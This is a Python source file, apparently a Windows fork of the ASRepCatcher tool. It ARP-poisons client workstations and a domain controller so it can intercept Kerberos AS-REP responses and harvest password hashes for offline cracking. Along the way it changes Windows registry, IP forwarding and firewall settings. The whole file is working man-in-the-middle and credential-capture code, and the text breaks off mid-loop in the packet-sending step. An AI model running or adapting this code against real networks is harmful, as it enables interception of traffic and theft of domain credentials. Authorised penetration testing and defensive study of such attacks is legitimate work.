#!/usr/bin/env python3

# Authors : Yassine OUKESSOU, Samara Eli

from scapy.all import *
from scapy.layers.l2 import Ether, ARP
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import sendp, send, srp, sniff
from scapy.config import conf
from scapy.arch import get_if_list, get_if_addr
from scapy.packet import Packet, bind_layers, Raw
from scapy.fields import XIntField, StrField
from scapy.layers.kerberos import *
from scapy.asn1.asn1 import ASN1_INTEGER
from scapy.layers.l2 import getmacbyip

# Try importing TCPSession for better packet processing
try:
    from scapy.sessions import TCPSession
    HAVE_TCP_SESSION = True
except ImportError:
    HAVE_TCP_SESSION = False
    
# Define Kerberos constants if not available
if 'KRB_AS_REP' not in globals():
    KRB_AS_REP = 11
    
if 'KRB_TGS_REP' not in globals():
    KRB_TGS_REP = 13
    
if 'KerberosTCPHeader' not in globals():
    class KerberosTCPHeader(Packet):
        name = "Kerberos TCP Header"
        fields_desc = [XIntField("length", None)]
        
        def post_build(self, p, pay):
            if self.length is None and pay:
                l = len(pay)
                p = struct.pack("!I", l) + pay
                return p
            return p + pay

import asn1
import os
import subprocess
import argparse
import time
import threading
import ipaddress
from termcolor import colored
import socket
import asyncio
import logging
import netifaces
import ctypes
import sys
import re
import tempfile
import signal
import atexit
from datetime import datetime
import struct

# Rich library imports for enhanced formatting (scrolling output only)
from rich.console import Console
from rich.text import Text

import time
import struct

# Global variables
decoder = asn1.Decoder()
stop_arp_spoofing_flag = threading.Event()
stop_sniffer = threading.Event()  # Flag to stop the sniffer thread
cleanup_performed = False  # Flag to prevent multiple cleanup calls

# Rich display management (simplified)
console = Console()

# Global variables that will be set in main()
mode = None
outfile = None
HashFormat = None
iface = None
disable_spoofing = None
stop_spoofing = None
gw = None
dc = None
debug = None
hwsrc = None
Targets = None
InitialTargets = None
TargetsList = None
firewall_backup_file = None
original_ip_forward = None
relay_port = 88
skip_redirection = False
tcp_session_available = False
hashes_captured = 0  # Simple counter for captured hashes

# Debug message scroll (simplified)
debug_messages = []
MAX_DEBUG_MESSAGES = 10


# =======================================
# LOGGING FUNCTIONS (with Rich formatting)
# =======================================

def add_debug_message(message):
    """Add a debug message to the scrolling display"""
    global debug_messages
    debug_messages.append(f"[{datetime.now().strftime('%H:%M:%S')}] {message}")
    if len(debug_messages) > MAX_DEBUG_MESSAGES:
        debug_messages.pop(0)

def print_setup_banner():
    """Print the setup banner using Rich"""
    banner_text = """
╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    █████╗ ███████╗██████╗ ███████╗██████╗  ██████╗ █████╗ ████████╗ ██████╗██╗  ██╗███████╗██████╗     ║
║   ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝██║  ██║██╔════╝██╔══██╗    ║
║   ███████║███████╗██████╔╝█████╗  ██████╔╝██║     ███████║   ██║   ██║     ███████║█████╗  ██████╔╝    ║
║   ██╔══██║╚════██║██╔══██╗██╔══╝  ██╔═══╝ ██║     ██╔══██║   ██║   ██║     ██╔══██║██╔══╝  ██╔══██╗    ║
║   ██║  ██║███████║██║  ██║███████╗██║     ╚██████╗██║  ██║   ██║   ╚██████╗██║  ██║███████╗██║  ██║    ║
║   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ║
║                                                                                                        ║
║                                  Windows Edition - Enhanced Interface                                  ║
║                            Authors:  Samara Eli, forked from Yassine OUKESSOU                          ║
║                                              Version: 0.0.1                                            ║
╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝
    """
    console.print(Text(banner_text.strip(), style="bold cyan"))

def rich_print_info(message, style="cyan"):
    """Print info message using Rich scrolling output"""
    console.print(f"[{style}][*][/{style}] {message}")
    add_debug_message(f"[INFO] {message}")

def rich_print_success(message):
    """Print success message using Rich scrolling output"""
    console.print(f"[bold green][+][/bold green] {message}")

def rich_print_warning(message):
    """Print warning message using Rich scrolling output"""
    console.print(f"[bold yellow][!][/bold yellow] {message}")
    add_debug_message(f"[WARN] {message}")

def rich_print_error(message):
    """Print error message using Rich scrolling output"""
    console.print(f"[bold red][!][/bold red] {message}")
    add_debug_message(f"[ERROR] {message}")

def rich_print_hash(username, domain, etype, hash_string):
    """Print captured hash with Rich formatting (scrolling)"""
    console.print("")
    console.print(f"[bold green]{'='*60}[/bold green]")
    console.print(f"[bold green] HASH CAPTURED! [/bold green]")
    console.print(f"[bold cyan]Username:[/bold cyan] {username}@{domain}")
    console.print(f"[bold yellow]Encryption Type:[/bold yellow] {etype}")
    console.print(f"[bold green]Hash:[/bold green] {hash_string}")
    console.print(f"[bold green]{'='*60}[/bold green]")
    console.print("")

# =======================================
# WINDOWS NETWORKING SETUP
# =======================================

def setup_windows_networking():
    """Enhanced Windows networking setup for relay mode"""
    rich_print_info("[SETUP] Configuring Windows networking for AS-REP capture...", "yellow")
    
    try:
        # Check current IP forwarding status
        result = subprocess.run(
            ['netsh', 'interface', 'ipv4', 'show', 'global'],
            capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        rich_print_info(f"[SETUP] Current IP forwarding status checked", "blue")
        
        # CRITICAL: Add special packet forwarding configuration for ARP spoofing
        # These settings help ensure packets flow properly during MITM attacks
        registry_result = subprocess.run([
            'reg', 'add', 
            'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters',
            '/t', 'REG_DWORD', 
            '/v', 'IPEnableRouter', 
            '/d', '1', 
            '/f'
        ], capture_output=True, text=True)
        
        if registry_result.returncode == 0:
            rich_print_success("[SETUP] ✓ Registry IP forwarding enabled - critical for ARP spoofing")
        else:
            rich_print_warning("[SETUP] Failed to set registry IP forwarding")
        
        # Optimize Windows network stack for MITM operations
        try:
            # Disable Large Send Offload (can interfere with packet forwarding)
            subprocess.run(['netsh', 'int', 'tcp', 'set', 'global', 'chimney=disabled'], 
                         capture_output=True, text=True, timeout=5)
            # Set MTU to standard value to avoid fragmentation issues
            subprocess.run(['netsh', 'interface', 'ipv4', 'set', 'subinterface', iface, 'mtu=1500'], 
                         capture_output=True, text=True, timeout=5)
            rich_print_info("[SETUP] Network stack optimized for packet forwarding", "green")
        except Exception as e:
            rich_print_warning(f"[SETUP] Network optimization error: {e}")
        
        # Enable IP forwarding on Windows
        try:
            subprocess.run(
                ['netsh', 'interface', 'ipv4', 'set', 'global', 'forwarding=enabled'],
                check=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
            )
            rich_print_success("[SETUP] ✓ IP forwarding enabled")
        except subprocess.CalledProcessError as e:
            rich_print_warning(f"[SETUP] IP forwarding command failed (may need admin): {e}")
        
        # Show network interface information
        try:
            interface_result = subprocess.run(
                ['netsh', 'interface', 'ipv4', 'show', 'interfaces'],
                capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW
            )
            if interface_result.returncode == 0:
                rich_print_info("[SETUP] Network interfaces information logged", "blue")
        except Exception as e:
            rich_print_info(f"[SETUP] Interface check skipped: {e}", "blue")
            
        rich_print_info("[SETUP] Windows networking configuration complete", "green")
        rich_print_warning("[RELAY] Note: If AS-REP still bypasses VM, consider ARP spoofing")
        
    except Exception as e:
        rich_print_error(f"[SETUP] Windows networking setup error: {e}")

# =======================================
# SIGNAL HANDLING AND CLEANUP
# =======================================

def check_port_usage(port=88):
    """Check what processes are using the specified port"""
    try:
        result = subprocess.run(['netstat', '-ano'], capture_output=True, text=True, timeout=5)
        lines = result.stdout.split('\n')
        port_lines = [line for line in lines if f':{port} ' in line and 'LISTENING' in line]
        
        if port_lines:
            rich_print_warning(f'[PORT CHECK] Found processes using port {port}:')
            for line in port_lines:
                parts = line.split()
                if len(parts) >= 5:
                    pid = parts[-1]
                    rich_print_info(f'[PORT CHECK] PID {pid}: {line.strip()}', 'yellow')
                    
                    # Try to get process name
                    try:
                        tasklist_result = subprocess.run(['tasklist', '/FI', f'PID eq {pid}'], 
                                                       capture_output=True, text=True, timeout=3)
                        if tasklist_result.returncode == 0:
                            tasklist_lines = tasklist_result.stdout.split('\n')
                            for tl in tasklist_lines:
                                if pid in tl:
                                    rich_print_info(f'[PORT CHECK] Process: {tl.strip()}', 'cyan')
                                    break
                    except:
                        pass
            return True
        else:
            rich_print_success(f'[PORT CHECK] Port {port} appears to be free')
            return False
    except Exception as e:
        rich_print_warning(f'[PORT CHECK] Could not check port usage: {e}')
        return False

def cleanup_port_88():
    """Clean up anything that might be using port 88"""
    rich_print_info('[CLEANUP] Checking for port 88 conflicts...', 'yellow')
    
    # First clean up our own traffic redirection
    cleanup_traffic_redirection()
    
    # Check if port is still in use
    if check_port_usage(88):
        rich_print_warning('[CLEANUP] Port 88 is still in use after cleanup')
        rich_print_info('[CLEANUP] This might be Windows Kerberos service or another application', 'yellow')
        rich_print_info('[CLEANUP] Consider stopping conflicting services or using --disable-spoofing mode', 'yellow')
        return False
    
    return True

def cleanup_all():
    """Comprehensive cleanup function called on exit."""
    global firewall_backup_file, original_ip_forward, stop_arp_spoofing_flag, stop_sniffer, cleanup_performed
    
    # Prevent multiple cleanup calls
    if cleanup_performed:
        return
    cleanup_performed = True
    
    # Signal the sniffer to stop
    try:
        stop_sniffer.set()
        rich_print_info('[CLEANUP] Stopping packet sniffer', 'yellow')
    except Exception as e:
        if debug:
            rich_print_error(f'[CLEANUP] Error stopping sniffer: {e}')
    
    try:
        # Stop ARP spoofing
        if not disable_spoofing:
            stop_arp_spoofing_flag.set()
            if 'Targets' in globals() and Targets is not None:
                rich_print_info('Restoring ARP cache, please hold...')
                restore_all_targets()
    except Exception as e:
        if debug:
            rich_print_error(f'Error during ARP cleanup: {e}')
    
    try:
        # Clean up traffic redirection and port bindings
        cleanup_port_88()
    except Exception as e:
        if debug:
            rich_print_error(f'Error during traffic redirection cleanup: {e}')
    
    try:
        # Restore IP forwarding
        if original_ip_forward is not None:
            restore_ip_forwarding(original_ip_forward)
            if debug:
                rich_print_success('Restored original IP forwarding setting')
    except Exception as e:
        if debug:
            rich_print_error(f'Error restoring IP forwarding: {e}')
    
    try:
        # Restore firewall rules
        if firewall_backup_file is not None:
            restore_firewall_rules(firewall_backup_file)
            if debug:
                rich_print_success('Restored firewall backup')
    except Exception as e:
        if debug:
            rich_print_error(f'Error restoring firewall: {e}')

def signal_handler(sig, frame):
    """Handle signals for graceful shutdown."""
    
    console.print(f'\n[bold yellow][*][/bold yellow] Received interrupt signal {sig}, cleaning up...')
    if debug:
        console.print(f'[dim][DEBUG] Signal handler called from frame: {frame}[/dim]')
    
    # Set the global stop flags immediately
    try:
        # Stop ARP spoofing
        stop_arp_spoofing_flag.set()
        # Stop packet sniffer
        stop_sniffer.set()
        console.print('[bold yellow][*][/bold yellow] Stopping all background threads...')
    except NameError:
        pass  # Flags might not be initialized yet
    
    try:
        cleanup_all()
    except Exception as e:
        console.print(f'[bold red][!][/bold red] Error during cleanup: {e}')
    finally:
        console.print('[bold green][*][/bold green] Cleanup completed, exiting...')
        
        # Print final summary
        try:
            console.print("\n[bold green]Session Summary[/bold green]")
            console.print(f"[green]Hashes Captured:[/green] {hashes_captured}")
            console.print(f"[yellow]Output File:[/yellow] {outfile}")
        except NameError:
            pass  # Variables might not be initialized yet
        
        # Force exit immediately - don't wait for anything
        try:
            os._exit(0)
        except:
            # Last resort
            import sys
            sys.exit(1)

# =======================================
# UTILITY FUNCTIONS
# =======================================

def is_admin():
    """Check if the script is running with administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def display_banner():
    """Display the ASRepCatcher banner using Rich formatting"""
    print_setup_banner()

def is_dc_up(dc):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((dc,88))
    sock.close()
    if result == 0:
        return True
    return False

def is_valid_ip_list(iplist):
    if not re.match(r'^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?),)*((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$', iplist) :
        return False
    return True

def is_valid_ipwithmask(ip_with_mask):
    if not re.match(r'^([01]?\d\d?|2[0-4]\d|25[0-5])(?:\.(?:[01]?\d\d?|2[0-4]\d|25[0-5])){3}(?:/[0-2]\d|/3[0-2])?$', ip_with_mask):
        return False
    return True



def valid_ip(address):
    try: 
        a = ipaddress.ip_address(address)
        return True
    except:
        return False

def get_available_interfaces():
    """Get list of available network interfaces with their details - Scapy compatible"""
    interfaces = []
    try:
        # Start with Scapy interface list - these are the names that actually work
        scapy_interfaces = get_if_list()
        
        for scapy_iface in scapy_interfaces:
            try:
                # Get IP address using Scapy
                ip_addr = get_if_addr(scapy_iface)
                
                # Skip interfaces without proper IP (like 0.0.0.0 or empty)
                if not ip_addr or ip_addr == '0.0.0.0':
                    continue
                
                # Get MAC address and other details
                mac_addr = 'N/A'
                netmask = 'N/A'
                
                try:
                    # Try to get additional details from netifaces if available
                    for neti_name in netifaces.interfaces():
                        try:
                            neti_addrs = netifaces.ifaddresses(neti_name)
                            if netifaces.AF_INET in neti_addrs:
                                neti_ip = neti_addrs[netifaces.AF_INET][0].get('addr', '')
                                if neti_ip == ip_addr:
                                    netmask = neti_addrs[netifaces.AF_INET][0].get('netmask', 'N/A')
                                    if netifaces.AF_LINK in neti_addrs:
                                        mac_addr = neti_addrs[netifaces.AF_LINK][0].get('addr', 'N/A')
                                    break
                        except:
                            continue
                except:
                    pass
                
                # Create a user-friendly display name
                display_name = scapy_iface
                if len(scapy_iface) > 25:
                    # Shorten long interface names for display
                    display_name = f"{scapy_iface[:12]}...{scapy_iface[-8:]}"
                
                interfaces.append({
                    'name': scapy_iface,  # This is the Scapy-compatible name
                    'display_name': display_name,
                    'ip': ip_addr,
                    'netmask': netmask,
                    'mac': mac_addr
                })
            except Exception as e:
                # Skip interfaces that cause errors
                continue
                
    except Exception as e:
        logging.error(f'[!] Could not enumerate interfaces: {e}')
    
    return interfaces

def select_interface():
    """Let user select network interface"""
    interfaces = get_available_interfaces()
    
    if not interfaces:
        rich_print_error('No network interfaces found with IPv4 addresses')
        return None
    
    # Display interface selection with Rich formatting
    console.print("\n[bold cyan]Available Network Interfaces:[/bold cyan]")
    console.print("[cyan]" + "="*80 + "[/cyan]")
    
    for i, iface_info in enumerate(interfaces):
        console.print(f"[cyan]{i+1:2}.[/cyan] [green]{iface_info['display_name']:<25}[/green] "
                     f"[yellow]{iface_info['ip']:<15}[/yellow] [magenta]{iface_info['mac']}[/magenta]")
    
    console.print("[cyan]" + "="*80 + "[/cyan]")
    
    while True:
        try:
            choice = console.input(f"\n[cyan]Select interface (1-{len(interfaces)}): [/cyan]").strip()
            if choice.isdigit():
                idx = int(choice) - 1
                if 0 <= idx < len(interfaces):
                    selected = interfaces[idx]
                    rich_print_success(f"Selected interface: {selected['display_name']} ({selected['ip']})")
                    # Return the actual Scapy name that will work
                    return selected['name']
            rich_print_warning(f"Please enter a number between 1 and {len(interfaces)}")
        except (KeyboardInterrupt, EOFError):
            rich_print_warning("Interface selection cancelled")
            return None
        except Exception as e:
            rich_print_error(f"Invalid input: {e}")

def get_temp_file_path(filename):
    """Get a cross-platform temporary file path."""
    temp_dir = tempfile.gettempdir()
    return os.path.join(temp_dir, filename)

# ============================================================================
# NETWORK CONFIGURATION FUNCTIONS
# ============================================================================

def get_ip_forwarding_status():
    """Get current IP forwarding status."""
    try:
        result = subprocess.run(['netsh', 'interface', 'ipv4', 'show', 'global'], 
                              capture_output=True, text=True, check=True, timeout=10)
        # Look for "Forwarding" in the output
        return "Enabled" in result.stdout and "Forwarding" in result.stdout
    except:
        return False

def enable_ip_forwarding():
    """Enable IP forwarding on Windows using both netsh and registry methods."""
    try:
        rich_print_info('[IP FORWARD] Enabling Windows IP forwarding for ARP spoofing...', 'yellow')
        
        # Method 1: Traditional netsh command
        result1 = subprocess.run(['netsh', 'interface', 'ipv4', 'set', 'global', 'forwarding=enabled'], 
                              capture_output=True, text=True, check=True, timeout=10)
        
        # Method 2: Registry method (CRITICAL for ARP spoofing to work properly)
        # This is the critical fix for Windows ARP spoofing + packet forwarding
        registry_result = subprocess.run([
            'reg', 'add', 
            'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters',
            '/t', 'REG_DWORD', 
            '/v', 'IPEnableRouter', 
            '/d', '1', 
            '/f'
        ], capture_output=True, text=True, timeout=10)
        
        # Method 3: ADDITIONAL Windows configuration for packet redirection
        # Enable routing on the specific interface - CRITICAL for ARP spoofing
        try:
            # This is often the missing piece for Windows ARP spoofing
            result_iface = subprocess.run([
                'netsh', 'interface', 'ipv4', 'set', 'interface', 
                f'interface="{iface}"', 'forwarding=enabled'
            ], capture_output=True, text=True, timeout=10)
            
            if result_iface.returncode == 0:
                rich_print_success('[IP FORWARD] ✓ Interface-specific routing enabled')
            else:
                rich_print_warning(f'[IP FORWARD] Interface routing warning: {result_iface.stderr}')
                
        except Exception as iface_e:
            rich_print_warning(f'[IP FORWARD] Interface config error: {iface_e}')
        
        # Method 4: Additional Windows routing service
        try:
            routing_result = subprocess.run(['sc', 'config', 'RemoteAccess', 'start=', 'auto'], 
                                          capture_output=True, text=True, timeout=10)
            start_result = subprocess.run(['sc', 'start', 'RemoteAccess'], 
                                        capture_output=True, text=True, timeout=10)
        except Exception as service_e:
            pass  # Service setup is optional
        
        # Return success if at least one method worked
        success = (result1.returncode == 0) or (registry_result.returncode == 0)
        if success:
            rich_print_success('[IP FORWARD] ✓ Windows IP forwarding enabled for ARP spoofing')
        
        return success
        
    except Exception as e:
        rich_print_error(f'[IP FORWARD] Could not enable IP forwarding on Windows: {e}')
        return False

def restore_ip_forwarding(original_status):
    """Restore IP forwarding to original status."""
    try:
        rich_print_info('[CLEANUP] Restoring IP forwarding settings...', 'yellow')
        
        # Method 1: Restore netsh setting
        status = 'enabled' if original_status else 'disabled'
        subprocess.run(['netsh', 'interface', 'ipv4', 'set', 'global', f'forwarding={status}'], 
                      capture_output=True, text=True, check=True, timeout=10)
        rich_print_info(f'[CLEANUP] ✓ netsh IP forwarding restored to {status}', 'green')
        
        # Method 2: Restore registry setting if we had disabled it
        if not original_status:
            registry_result = subprocess.run([
                'reg', 'add', 
                'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters',
                '/t', 'REG_DWORD', 
                '/v', 'IPEnableRouter', 
                '/d', '0', 
                '/f'
            ], capture_output=True, text=True, timeout=10)
            
            if registry_result.returncode == 0:
                rich_print_info('[CLEANUP] ✓ Registry IP forwarding restored to original state', 'green')
            else:
                rich_print_warning(f'[CLEANUP] Could not restore registry IP forwarding: {registry_result.stderr}')
        
        logging.info('[*] Restored IP forwarding value on Windows')
        
    except Exception as e:
        rich_print_warning(f'[CLEANUP] Could not restore IP forwarding on Windows: {e}')
        logging.error(f'[!] Could not restore IP forwarding on Windows: {e}')

# ============================================================================
# FIREWALL MANAGEMENT FUNCTIONS
# ============================================================================

def backup_firewall_rules():
    """Backup current Windows Firewall rules."""
    try:
        # Export Windows Firewall rules
        backup_file = get_temp_file_path('asrepcatcher_firewall_backup.wfw')
        
        # Remove existing backup file if it exists
        try:
            if os.path.exists(backup_file):
                os.remove(backup_file)
                logging.debug(f'[*] Removed existing backup file: {backup_file}')
        except Exception as remove_e:
            logging.debug(f'[*] Could not remove existing backup file: {remove_e}')
        
        # First, check if Windows Firewall service is running
        try:
            service_check = subprocess.run(['sc', 'query', 'MpsSvc'], 
                                         capture_output=True, text=True, check=True, timeout=10)
            if 'RUNNING' not in service_check.stdout:
                logging.warning('[!] Windows Firewall service (MpsSvc) is not running')
                logging.info('[*] Attempting to start Windows Firewall service...')
                try:
                    subprocess.run(['sc', 'start', 'MpsSvc'], 
                                 capture_output=True, text=True, check=True, timeout=15)
                    time.sleep(2)  # Give service time to start
                except:
                    logging.warning('[!] Could not start Windows Firewall service')
        except:
            logging.debug('[*] Could not check Windows Firewall service status')
        
        # Try the export command with detailed error reporting
        result = subprocess.run(['netsh', 'advfirewall', 'export', backup_file], 
                              capture_output=True, text=True, timeout=15)
        
        if result.returncode == 0:
            logging.debug(f'[*] Successfully backed up firewall rules to {backup_file}')
            return backup_file
        else:
            # Log the specific error
            logging.error(f'[!] netsh advfirewall export failed with return code {result.returncode}')
            logging.error(f'[!] stdout: {result.stdout}')
            logging.error(f'[!] stderr: {result.stderr}')
            
            # Try alternative backup method - just create a minimal backup
            logging.info('[*] Attempting alternative firewall backup method...')
            try:
                # Get current firewall state
                result2 = subprocess.run(['netsh', 'advfirewall', 'show', 'allprofiles'], 
                                       capture_output=True, text=True, check=True, timeout=10)
                
                # Save current state info to a text file for reference
                alt_backup_file = get_temp_file_path('asrepcatcher_firewall_state.txt')
                
                # Remove existing alternative backup file if it exists
                try:
                    if os.path.exists(alt_backup_file):
                        os.remove(alt_backup_file)
                        logging.debug(f'[*] Removed existing alternative backup file: {alt_backup_file}')
                except Exception as alt_remove_e:
                    logging.debug(f'[*] Could not remove existing alternative backup file: {alt_remove_e}')
                
                with open(alt_backup_file, 'w') as f:
                    f.write("ASRepCatcher Firewall State Backup\n")
                    f.write("=" * 50 + "\n")
                    f.write(result2.stdout)
                    f.write("\n\nNote: This is a state backup, not a restorable export.\n")
                    f.write("Manual firewall rule cleanup may be required.\n")
                
                logging.info(f'[*] Created alternative firewall state backup: {alt_backup_file}')
                return alt_backup_file
                
            except Exception as alt_e:
                logging.error(f'[!] Alternative backup method also failed: {alt_e}')
                
                # Final fallback - create an empty marker file
                marker_file = get_temp_file_path('asrepcatcher_no_firewall_backup.txt')
                
                # Remove existing marker file if it exists
                try:
                    if os.path.exists(marker_file):
                        os.remove(marker_file)
                        logging.debug(f'[*] Removed existing marker file: {marker_file}')
                except Exception as marker_remove_e:
                    logging.debug(f'[*] Could not remove existing marker file: {marker_remove_e}')
                
                with open(marker_file, 'w') as f:
                    f.write("No firewall backup available\n")
                    f.write("Manual cleanup may be required\n")
                
                logging.warning('[!] No firewall backup possible - continuing with marker file')
                logging.warning('[!] You may need to manually check firewall rules after execution')
                return marker_file
                
    except Exception as e:
        logging.error(f'[!] Could not back up Windows Firewall: {e}')
        
        # Create a marker file so the script can continue
        try:
            marker_file = get_temp_file_path('asrepcatcher_no_firewall_backup.txt')
            
            # Remove existing marker file if it exists
            try:
                if os.path.exists(marker_file):
                    os.remove(marker_file)
                    logging.debug(f'[*] Removed existing exception marker file: {marker_file}')
            except Exception as exc_remove_e:
                logging.debug(f'[*] Could not remove existing exception marker file: {exc_remove_e}')
            
            with open(marker_file, 'w') as f:
                f.write("Firewall backup failed\n")
                f.write("Manual cleanup may be required\n")
            logging.warning('[!] Created backup failure marker - continuing execution')
            return marker_file
        except:
            return None

def configure_firewall_forwarding():
    """Configure Windows Firewall for packet forwarding."""
    try:
        # Enable Windows Firewall forwarding
        subprocess.run(['netsh', 'advfirewall', 'set', 'global', 'statefulFTP', 'disable'], 
                      capture_output=True, text=True, check=True, timeout=15)
        subprocess.run(['netsh', 'advfirewall', 'set', 'global', 'statefulftp', 'disable'], 
                      capture_output=True, text=True, check=True, timeout=15)
        logging.debug('[*] Configured Windows Firewall for forwarding')
    except Exception as e:
        logging.error(f'[!] Could not configure Windows Firewall: {e}')

def cleanup_traffic_redirection():
    """Clean up Windows traffic redirection rules."""
    try:
        rich_print_info('[CLEANUP] Removing Windows port redirection rules...', 'yellow')
        
        # Remove Windows port proxy redirection for Kerberos (port 88)
        result = subprocess.run(['netsh', 'interface', 'portproxy', 'delete', 'v4tov4', 
                      'listenport=88', 'listenaddress=0.0.0.0'], 
                      capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            rich_print_success('[CLEANUP] Removed port 88 redirection rule')
        else:
            rich_print_info('[CLEANUP] No port 88 redirection rule to remove')
        
        # Also try to remove any alternative port redirections
        for alt_port in [8888, 8889, 8890]:
            try:
                subprocess.run(['netsh', 'interface', 'portproxy', 'delete', 'v4tov4', 
                              f'listenport={alt_port}', 'listenaddress=0.0.0.0'], 
                              capture_output=True, text=True, timeout=5)
            except:
                pass
        
        # Try to remove the firewall rules we added
        firewall_rules = ['ASRepCatcher_Kerberos', 'ASRepCatcher_Kerberos_8888', 'ASRepCatcher_Kerberos_8889']
        for rule_name in firewall_rules:
            try:
                result = subprocess.run(['netsh', 'advfirewall', 'firewall', 'delete', 'rule', 
                              f'name={rule_name}'], 
                              capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    rich_print_success(f'[CLEANUP] Removed firewall rule: {rule_name}')
            except Exception as fw_e:
                pass  # Rule might not exist
        
        # Give Windows time to release ports
        time.sleep(1)
        rich_print_success('[CLEANUP] Traffic redirection cleanup completed')
        logging.debug('[*] Cleaned up Windows port redirection for Kerberos')
            
    except Exception as e:
        rich_print_warning(f'[CLEANUP] Could not clean up Windows port redirection: {e}')
        logging.debug(f'[*] Could not clean up Windows port redirection: {e}')


def restore_firewall_rules(backup_file):
    """Restore Windows Firewall rules from backup."""
    if not backup_file:
        return
        
    try:
        # Clean up port redirection first
        subprocess.run(['netsh', 'interface', 'portproxy', 'delete', 'v4tov4', 
                      'listenport=88', 'listenaddress=0.0.0.0'], 
                      capture_output=True, text=True, timeout=10)
        
        # Check if this is a real backup file or just a marker
        if backup_file.endswith('_no_firewall_backup.txt'):
            logging.info('[*] No firewall backup to restore - cleaning up marker file')
            try:
                os.remove(backup_file)
            except:
                pass
            return
            
        if backup_file.endswith('_firewall_state.txt'):
            logging.info('[*] State-only backup detected - no automatic restore possible')
            logging.info('[*] Please check firewall rules manually if needed')
            try:
                os.remove(backup_file)
            except:
                pass
            return
        
        # Try to import the backup if it's a real .wfw file
        if backup_file.endswith('.wfw'):
            result = subprocess.run(['netsh', 'advfirewall', 'import', backup_file], 
                                  capture_output=True, text=True, timeout=15)
            
            if result.returncode == 0:
                logging.info("[*] Restored Windows Firewall rules")
            else:
                logging.warning(f'[!] Could not restore firewall rules: {result.stderr}')
                logging.info('[*] Please check firewall rules manually')
            
            # Clean up backup file
            try:
                os.remove(backup_file)
            except:
                pass
        else:
            logging.info('[*] Unknown backup file format - no restore attempted')
            
    except Exception as e:
        logging.error(f'[!] Could not restore Windows Firewall: {e}')
        logging.info('[*] Please check firewall rules manually')

# ============================================================================
# ARP SPOOFING FUNCTIONS
# ============================================================================

def get_mac_addresses(ip_list):
    # Check for interruption before ARP scan
    if stop_arp_spoofing_flag.is_set():
        return {}
    
    mac_addresses = {}
    try:
        ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_list),timeout=1,verbose=False, iface=iface, retry=1)
        for i in ans :
            mac_addresses[i[1].psrc] = i[1].hwsrc
    except Exception as e:
        pass
    
    return(mac_addresses)

def relaymode_arp_spoof(spoofed_ip):
    global Targets
    # mac_addresses = update_uphosts()
    mac_addresses = get_mac_addresses(TargetsList)
    
    # CRITICAL: Get DC MAC address for bidirectional spoofing
    dc_mac_addresses = get_mac_addresses([dc])
    if dc not in dc_mac_addresses:
        rich_print_error(f'[ARP RELAY] CRITICAL: Cannot get DC MAC address for {dc}')
        return
    
    dc_mac = dc_mac_addresses[dc]
    timer = 0
    
    rich_print_info(f'[ARP RELAY] Starting BIDIRECTIONAL relay mode ARP spoofing', 'yellow')
    rich_print_info(f'[ARP RELAY] Targets: {len(mac_addresses)} clients', 'yellow')
    rich_print_info(f'[ARP RELAY] DC: {dc} ({dc_mac})', 'yellow')
    rich_print_info(f'[ARP RELAY] Interface: {iface}, Source MAC: {hwsrc}', 'yellow')
    
    # Configure Windows packet forwarding - CRITICAL to do before ARP spoofing
    try:
        rich_print_info('[ARP RELAY] Setting up Windows packet forwarding...', 'yellow')
        # Enable IP forwarding
        subprocess.run(['netsh', 'interface', 'ipv4', 'set', 'global', 'forwarding=enabled'], 
                     capture_output=True, text=True, timeout=10)
        # Ensure packets aren't being filtered
        subprocess.run(['netsh', 'advfirewall', 'set', 'global', 'statefulftp', 'disable'], 
                     capture_output=True, text=True, timeout=10)
        rich_print_success('[ARP RELAY] ✓ Packet forwarding configured for ARP spoofing')
    except Exception as e:
        rich_print_error(f'[ARP RELAY] Error configuring packet forwarding: {e}')
    
    # Do strong initial poisoning
    rich_print_info('[ARP RELAY] Performing STRONG initial ARP poisoning...', 'yellow')
    
    # Prepare initial poisoning packets
    packets_list = []
    
    # STEP 1: Poison CLIENT workstations (tell them DC is at our MAC)
    for target in mac_addresses :
        if stop_arp_spoofing_flag.is_set():
            return
        
        # Tell client that DC is at our MAC address
        packet = Ether(src=hwsrc, dst=mac_addresses[target]) / ARP(op=2, hwsrc=hwsrc, psrc=dc, hwdst=mac_addresses[target], pdst=target)
        packets_list.append(packet)
        
        if debug:
            rich_print_info(f'[ARP CLIENT] Poisoning {target}: telling them DC {dc} is at {hwsrc}', 'cyan')
    
    # STEP 2: Poison DC (tell it that ALL clients are at our MAC)
    for target in mac_addresses:
        if stop_arp_spoofing_flag.is_set():
            return
        
        # Tell DC that each client is at our MAC address
        packet = Ether(src=hwsrc, dst=dc_mac) / ARP(op=2, hwsrc=hwsrc, psrc=target, hwdst=dc_mac, pdst=dc)
        packets_list.append(packet)
        
        if debug:
            rich_print_info(f'[ARP DC] Poisoning DC: telling {dc} that client {target} is at {hwsrc}', 'cyan')
    
    # Send initial poisoning packets multiple times for reliability
    if packets_list:
        # Send 3 times with slight delay between batches for better reliability
        for i in range(3):
